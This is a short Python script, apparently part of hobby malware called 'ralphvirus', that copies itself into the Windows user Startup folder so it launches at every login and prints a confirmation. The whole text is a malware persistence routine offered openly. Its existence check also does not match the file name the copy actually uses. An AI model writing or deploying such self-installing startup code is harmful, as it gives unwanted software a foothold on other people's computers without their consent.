import os
import shutil
from pathlib import Path

current_file_parth = os.path.abspath(__file__)
startup_folder = os.path.join(os.getenv('APPDATA'), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
startup_file_path = os.path.join(startup_folder, "ralphvirus.exe")

if not os.path.exists(startup_file_path):
    shutil.copy(current_file_parth, startup_folder)
    print(f"[ralphvirus.exe] has been added to the startup folder at {startup_file_path}")
else:
    print(f"[ralphvirus.exe] already exists in the startup folder")